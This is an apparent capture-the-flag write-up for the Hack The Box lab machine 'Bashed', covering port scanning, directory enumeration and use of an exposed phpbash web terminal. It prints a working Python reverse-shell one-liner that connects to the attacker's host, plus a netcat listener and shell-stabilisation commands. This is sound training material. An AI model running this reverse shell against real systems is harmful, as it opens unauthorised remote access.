# <center>BASHED</center>

<p align="center"><img src="https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/bashed_logo.png"></p>

Hey hackers. Let's solve and easy labeled linux based HTB machine named Bashed today. 

## Initial Step

- Download your open vpn configuration file and connect to htb vpn.
    - ```bash
        sudo openvpn <configuration_file_name>
      ```
- Join the machine to get an IP. (in my case it is 10.10.10.68).
- tasks given:
    - submit user flag (32 hex characters).
    - submit root flag (32 hex characters).

Now we are good to go. we can access the website through our browser. Now let's dive into our actual hacking stuffs 😉. (Disclaimer: By "hacking", I meant <strong><i>ETHICAL</strong> Hacking</i>)

<hr>

## Scanning and Enumeration

- performing agressive nmap scan on the given ip. `nmap -A -T4 10.10.10.68 -Pn`
    - -A -> agressive scan
    - -T4 -> to make the scan fast (-T0 is slowest and -T5 is fastest)
    - -Pn -> to avoid pinging the server coz we already know it's up and running.

```bash
┌──(cyb3ritic㉿kali)-[~]
└─$ nmap -A -T4 10.10.10.68 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 23:13 IST
Nmap scan report for 10.10.10.68
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   203.71 ms 10.10.14.1
2   191.21 ms 10.10.10.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

So from the scan we have just 1 port 80 open. So let's try to access the website at http://10.10.10.68.

![home page](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/home_page.png)

It has the website but the page donot contain any active functional links. hence it's useless. Let's try something else. 

- <strong> Enumerating directories for http://10.10.10.68 using <u>dirsearch</u> tool</strong> -> `dirsearch -u http://10.10.10.68 -i 200`
    - -u -> to mention the url
    - -i 200 -> only includes the result that gives 200 status code in response 

```bash
┌──(cyb3ritic㉿kali)-[~]
└─$ dirsearch -u http://10.10.10.68 -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/cyb3ritic/reports/http_10.10.10.68/_25-01-18_23-27-28.txt

Target: http://10.10.10.68/

[23:27:28] Starting: 
[23:27:42] 200 -    2KB - /about.html
[23:27:53] 200 -    0B  - /config.php
[23:27:54] 200 -    2KB - /contact.html
[23:27:56] 200 -  479B  - /dev/
[23:28:02] 200 -  513B  - /images/
[23:28:03] 200 -  660B  - /js/
[23:28:10] 200 -  454B  - /php/
[23:28:23] 200 -   14B  - /uploads/

Task Completed
```
We got plenty of pages, let's take a look at each of them.
- /about.html -> nothing interesting
- /config.php -> completely empty page
- /contact.html -> <strong>has some input fieds, let's keep it in out sus list for now ;)</strong>
- /dev -> <strong>contains a phpbash.php file which gives us a terminal like page while. It's more suspicious. </strong>
- /php -> contains sendMail.php file. It might be teh backend for /contact.html. 
-> uploads -> completely empty page

Let's try digging more into /dev/phpbash.php.

![bashed terminal](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/bashed_terminal.png)

The terminal works same like a normal linux shell. So we could easily get the user flag and root string ffrom this terminal itsef using the series of commands as showen in the below image.

![user flag direct](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/user_flag_direct.png)

However if we are taking some certification exams, such methods may not help. We need to get proper revershell and then obtain the flag. so we will solve this machine by obtaining a reverse shell.

So now my first intention is to obtain a reverse shell. For this one of the method would be to run some malicious script in the terminal and get the connection to our local system via netcat.

- set up a netcat listener in our terminal on port 1234 using following command: `nc -lnvp 1234`.

- since python is available let's use python reverse shell script to gain access.
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Immediately you will land a reverse shell in your netcat listener.

![gained revershell](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/rev_shell.png)

Now let's stabilize the shell first, then we will proced further to acquire flags. Use the following commands to stabilize your shell.

```bash
    python -c 'import pty;pty.spawn("/bin/bash")’
    export TERM=xterm

    press Ctrl + Z

    stty raw -echo; fg
```

Now following the same steps as before, we can acquire the user flag.

![user flag via reverse shell](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/user_flag.png)
